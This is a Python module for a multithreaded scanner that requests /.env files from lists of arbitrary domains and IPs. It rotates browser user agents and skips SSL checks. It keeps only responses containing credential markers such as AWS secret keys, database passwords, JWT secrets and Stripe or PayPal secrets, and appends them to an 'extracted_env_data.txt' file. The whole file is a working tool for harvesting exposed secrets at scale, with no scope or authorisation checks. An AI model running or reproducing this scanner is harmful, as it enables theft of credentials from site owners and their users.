"""
Scanner Core Module

Provides the base scanning functionality and shared utilities.
"""

import os
import random
import socket
import time
from concurrent.futures import ThreadPoolExecutor, as_completed, Future
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from queue import Queue, Empty
from threading import Lock, Event, local
from typing import List, Optional, Callable, Generator, Dict, Any, Set

import requests
from requests.adapters import HTTPAdapter


class ScannerState(Enum):
    """Scanner state enumeration."""
    IDLE = "idle"
    SCANNING = "scanning"
    PAUSED = "paused"
    STOPPING = "stopping"
    STOPPED = "stopped"
    ERROR = "error"


@dataclass
class ScanResult:
    """Represents a single scan result."""
    url: str
    success: bool
    content: Optional[str] = None
    error: Optional[str] = None
    timestamp: datetime = field(default_factory=datetime.now)
    response_time: float = 0.0
    
    def to_dict(self) -> Dict[str, Any]:
        """Convert result to dictionary."""
        return {
            'url': self.url,
            'success': self.success,
            'content': self.content,
            'error': self.error,
            'timestamp': self.timestamp.isoformat(),
            'response_time': self.response_time
        }


@dataclass
class ScanStats:
    """Scanner statistics."""
    total_scanned: int = 0
    successful: int = 0
    failed: int = 0
    start_time: Optional[datetime] = None
    elapsed_seconds: float = 0.0
    requests_per_second: float = 0.0
    success_rate: float = 0.0
    estimated_remaining: float = 0.0
    total_targets: int = 0
    
    def update(self) -> None:
        """Update calculated statistics."""
        if self.start_time:
            self.elapsed_seconds = (datetime.now() - self.start_time).total_seconds()
            if self.elapsed_seconds > 0:
                self.requests_per_second = self.total_scanned / self.elapsed_seconds
        
        if self.total_scanned > 0:
            self.success_rate = (self.successful / self.total_scanned) * 100
        
        if self.total_targets > 0 and self.requests_per_second > 0:
            remaining = self.total_targets - self.total_scanned
            self.estimated_remaining = remaining / self.requests_per_second


class ScannerCore:
    """Core scanner functionality."""
    
    # User agents for rotation
    USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0",
    ]
    
    # Env file validation patterns
    ENV_PATTERNS = [
        'DATABASE_URL=',
        'DB_PASSWORD=',
        'DB_HOST=',
        'AWS_ACCESS_KEY_ID=',
        'AWS_SECRET_ACCESS_KEY=',
        'APP_KEY=',
        'APP_DEBUG=',
        'MAIL_PASSWORD=',
        'REDIS_PASSWORD=',
        'JWT_SECRET=',
        'API_KEY=',
        'SECRET_KEY=',
        'STRIPE_SECRET=',
        'PAYPAL_SECRET=',
    ]
    
    def __init__(
        self,
        max_threads: int = 50,
        timeout: int = 5,
        request_delay: float = 0.1,
        retry_attempts: int = 3,
        output_directory: str = './results',
        verify_ssl: bool = False
    ):
        """
        Initialize the scanner.
        
        Args:
            max_threads: Maximum number of concurrent threads
            timeout: Request timeout in seconds
            request_delay: Delay between requests (rate limiting)
            retry_attempts: Number of retry attempts on failure
            output_directory: Directory to save results
            verify_ssl: Whether to verify SSL certificates (default False for scanning)
        """
        self.max_threads = max_threads
        self.timeout = timeout
        self.request_delay = request_delay
        self.retry_attempts = retry_attempts
        self.output_directory = output_directory
        self.verify_ssl = verify_ssl
        
        # State management
        self._state = ScannerState.IDLE
        self._state_lock = Lock()
        self._pause_event = Event()
        self._pause_event.set()  # Not paused by default
        self._stop_event = Event()
        
        # Statistics
        self._stats = ScanStats()
        self._stats_lock = Lock()
        
        # Results
        self._results_queue: Queue = Queue()
        self._successful_results: List[ScanResult] = []
        self._results_lock = Lock()
        
        # Callbacks
        self._on_result_callbacks: List[Callable[[ScanResult], None]] = []
        self._on_stats_callbacks: List[Callable[[ScanStats], None]] = []
        self._on_state_callbacks: List[Callable[[ScannerState], None]] = []
        
        # Thread-local storage for sessions
        self._thread_local = local()
        
        # Executor
        self._executor: Optional[ThreadPoolExecutor] = None
        self._active_futures: Set[Future] = set()
        
        # Ensure output directory exists
        if not os.path.exists(output_directory):
            os.makedirs(output_directory)
    
    @property
    def state(self) -> ScannerState:
        """Get current scanner state."""
        with self._state_lock:
            return self._state
    
    @state.setter
    def state(self, value: ScannerState) -> None:
        """Set scanner state and notify callbacks."""
        with self._state_lock:
            self._state = value
        
        for callback in self._on_state_callbacks:
            try:
                callback(value)
            except:
                pass
    
    @property
    def stats(self) -> ScanStats:
        """Get current statistics."""
        with self._stats_lock:
            self._stats.update()
            return self._stats
    
    def _get_session(self) -> requests.Session:
        """Get or create a thread-local session."""
        if not hasattr(self._thread_local, 'session'):
            session = requests.Session()
            adapter = HTTPAdapter(
                pool_connections=50,
                pool_maxsize=100,
                max_retries=0,
                pool_block=False
            )
            session.mount('http://', adapter)
            session.mount('https://', adapter)
            self._thread_local.session = session
        return self._thread_local.session
    
    def add_result_callback(self, callback: Callable[[ScanResult], None]) -> None:
        """Add callback for new results."""
        self._on_result_callbacks.append(callback)
    
    def add_stats_callback(self, callback: Callable[[ScanStats], None]) -> None:
        """Add callback for stats updates."""
        self._on_stats_callbacks.append(callback)
    
    def add_state_callback(self, callback: Callable[[ScannerState], None]) -> None:
        """Add callback for state changes."""
        self._on_state_callbacks.append(callback)
    
    def _notify_result(self, result: ScanResult) -> None:
        """Notify callbacks of a new result."""
        for callback in self._on_result_callbacks:
            try:
                callback(result)
            except:
                pass
    
    def _notify_stats(self) -> None:
        """Notify callbacks of stats update."""
        stats = self.stats
        for callback in self._on_stats_callbacks:
            try:
                callback(stats)
            except:
                pass
    
    def _normalize_target(self, target: str) -> Optional[str]:
        """
        Normalize a target (domain or IP) to a URL.
        
        Args:
            target: Domain name or IP address
            
        Returns:
            Normalized URL or None if invalid
        """
        target = target.strip()
        if not target:
            return None
        
        target = target.rstrip('/')
        
        if not target.startswith(('http://', 'https://')):
            return f"https://{target}"
        
        return target
    
    def _is_valid_env_content(self, content: str) -> bool:
        """
        Validate if content looks like a .env file.
        
        Args:
            content: Response content
            
        Returns:
            True if content appears to be a valid .env file
        """
        if not content or len(content) < 10:
            return False
        
        # Check for common env patterns
        return any(pattern in content for pattern in self.ENV_PATTERNS)
    
    def _fetch_env(self, target: str) -> ScanResult:
        """
        Fetch .env file from a target.
        
        Args:
            target: Domain or IP to scan
            
        Returns:
            ScanResult object
        """
        normalized = self._normalize_target(target)
        if not normalized:
            return ScanResult(
                url=target,
                success=False,
                error="Invalid target"
            )
        
        session = self._get_session()
        start_time = time.time()
        
        # URLs to try
        urls_to_try = [f"{normalized}/.env"]
        if normalized.startswith('https://'):
            http_url = normalized.replace('https://', 'http://')
            urls_to_try.append(f"{http_url}/.env")
        
        for attempt in range(self.retry_attempts):
            for url in urls_to_try:
                try:
                    # Check for pause
                    self._pause_event.wait()
                    
                    # Check for stop
                    if self._stop_event.is_set():
                        return ScanResult(
                            url=url,
                            success=False,
                            error="Scan stopped"
                        )
                    
                    headers = {
                        'User-Agent': random.choice(self.USER_AGENTS),
                        'Accept': '*/*',
                        'Accept-Encoding': 'gzip, deflate',
                        'Connection': 'close',
                    }
                    
                    response = session.get(
                        url,
                        headers=headers,
                        timeout=self.timeout,
                        allow_redirects=False,
                        verify=self.verify_ssl,
                        stream=False
                    )
                    
                    response_time = time.time() - start_time
                    
                    if response.status_code == 200 and response.text:
                        content = response.text
                        
                        if self._is_valid_env_content(content):
                            return ScanResult(
                                url=url,
                                success=True,
                                content=content,
                                response_time=response_time
                            )
                    
                except requests.exceptions.Timeout:
                    pass
                except requests.exceptions.ConnectionError:
                    pass
                except Exception as e:
                    pass
            
            # Delay before retry
            if attempt < self.retry_attempts - 1:
                time.sleep(0.5)
        
        return ScanResult(
            url=normalized,
            success=False,
            error="No .env file found",
            response_time=time.time() - start_time
        )
    
    def _process_target(self, target: str) -> ScanResult:
        """
        Process a single target.
        
        Args:
            target: Domain or IP to scan
            
        Returns:
            ScanResult object
        """
        # Rate limiting
        if self.request_delay > 0:
            time.sleep(random.uniform(0, self.request_delay))
        
        result = self._fetch_env(target)
        
        # Update statistics
        with self._stats_lock:
            self._stats.total_scanned += 1
            if result.success:
                self._stats.successful += 1
            else:
                self._stats.failed += 1
        
        # Store successful results
        if result.success:
            with self._results_lock:
                self._successful_results.append(result)
            self._save_result(result)
        
        # Put in results queue
        self._results_queue.put(result)
        
        # Notify callbacks
        self._notify_result(result)
        self._notify_stats()
        
        return result
    
    def _save_result(self, result: ScanResult) -> None:
        """Save a successful result to file."""
        if not result.success or not result.content:
            return
        
        try:
            filepath = os.path.join(self.output_directory, 'extracted_env_data.txt')
            with open(filepath, 'a', encoding='utf-8') as f:
                f.write("=" * 80 + "\n")
                f.write(f"SOURCE: {result.url}\n")
                f.write(f"TIMESTAMP: {result.timestamp.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("=" * 80 + "\n")
                f.write(result.content)
                f.write("\n\n")
        except IOError:
            pass
    
    def scan(
        self,
        targets: Generator[str, None, None],
        total_targets: int = 0,
        infinite: bool = False
    ) -> None:
        """
        Start scanning targets.
        
        Args:
            targets: Generator of target domains/IPs
            total_targets: Estimated total number of targets (for progress)
            infinite: If True, scan indefinitely
        """
        if self.state == ScannerState.SCANNING:
            return
        
        # Reset state
        self._stop_event.clear()
        self._pause_event.set()
        self.state = ScannerState.SCANNING
        
        # Reset statistics
        with self._stats_lock:
            self._stats = ScanStats()
            self._stats.start_time = datetime.now()
            self._stats.total_targets = total_targets
        
        # Disable SSL warnings only if SSL verification is disabled
        if not self.verify_ssl:
            import urllib3
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        
        try:
            with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
                self._executor = executor
                active_futures: Set[Future] = set()
                max_queue = self.max_threads * 2
                
                for target in targets:
                    # Check for stop
                    if self._stop_event.is_set():
                        break
                    
                    # Wait for pause to end
                    self._pause_event.wait()
                    
                    # Manage queue size
                    while len(active_futures) >= max_queue:
                        if self._stop_event.is_set():
                            break
                        
                        done_futures = {f for f in active_futures if f.done()}
                        for f in done_futures:
                            try:
                                f.result()
                            except:
                                pass
                        active_futures -= done_futures
                        
                        if len(active_futures) >= max_queue:
                            time.sleep(0.01)
                    
                    if self._stop_event.is_set():
                        break
                    
                    future = executor.submit(self._process_target, target)
                    active_futures.add(future)
                
                # Wait for remaining futures
                for future in as_completed(active_futures):
                    try:
                        future.result()
                    except:
                        pass
        
        except Exception as e:
            self.state = ScannerState.ERROR
            return
        
        finally:
            self._executor = None
        
        if self._stop_event.is_set():
            self.state = ScannerState.STOPPED
        else:
            self.state = ScannerState.IDLE
    
    def pause(self) -> None:
        """Pause scanning."""
        if self.state == ScannerState.SCANNING:
            self._pause_event.clear()
            self.state = ScannerState.PAUSED
    
    def resume(self) -> None:
        """Resume scanning."""
        if self.state == ScannerState.PAUSED:
            self._pause_event.set()
            self.state = ScannerState.SCANNING
    
    def stop(self) -> None:
        """Stop scanning gracefully."""
        self._stop_event.set()
        self._pause_event.set()  # Unpause to allow threads to exit
        self.state = ScannerState.STOPPING
    
    def get_results(self, limit: int = 100) -> List[ScanResult]:
        """
        Get recent results from the queue.
        
        Args:
            limit: Maximum number of results to return
            
        Returns:
            List of ScanResult objects
        """
        results = []
        while len(results) < limit:
            try:
                results.append(self._results_queue.get_nowait())
            except Empty:
                break
        return results
    
    def get_successful_results(self) -> List[ScanResult]:
        """Get all successful results."""
        with self._results_lock:
            return self._successful_results.copy()
    
    def clear_results(self) -> None:
        """Clear all stored results."""
        with self._results_lock:
            self._successful_results.clear()
        
        # Clear queue
        while True:
            try:
                self._results_queue.get_nowait()
            except Empty:
                break
    
    def export_results(
        self,
        filepath: str,
        format: str = 'txt',
        results: Optional[List[ScanResult]] = None
    ) -> bool:
        """
        Export results to a file.
        
        Args:
            filepath: Path to export file
            format: Export format ('txt', 'json', 'csv')
            results: Results to export (None for all successful)
            
        Returns:
            True if export was successful
        """
        if results is None:
            results = self.get_successful_results()
        
        try:
            if format == 'json':
                import json
                with open(filepath, 'w', encoding='utf-8') as f:
                    json.dump([r.to_dict() for r in results], f, indent=2)
            
            elif format == 'csv':
                import csv
                with open(filepath, 'w', newline='', encoding='utf-8') as f:
                    writer = csv.writer(f)
                    writer.writerow(['URL', 'Success', 'Timestamp', 'Response Time', 'Content Preview'])
                    for r in results:
                        content_preview = r.content[:100] if r.content else ''
                        writer.writerow([
                            r.url,
                            r.success,
                            r.timestamp.isoformat(),
                            r.response_time,
                            content_preview
                        ])
            
            else:  # txt
                with open(filepath, 'w', encoding='utf-8') as f:
                    for r in results:
                        f.write("=" * 80 + "\n")
                        f.write(f"SOURCE: {r.url}\n")
                        f.write(f"TIMESTAMP: {r.timestamp.strftime('%Y-%m-%d %H:%M:%S')}\n")
                        f.write("=" * 80 + "\n")
                        if r.content:
                            f.write(r.content)
                        f.write("\n\n")
            
            return True
        
        except IOError:
            return False
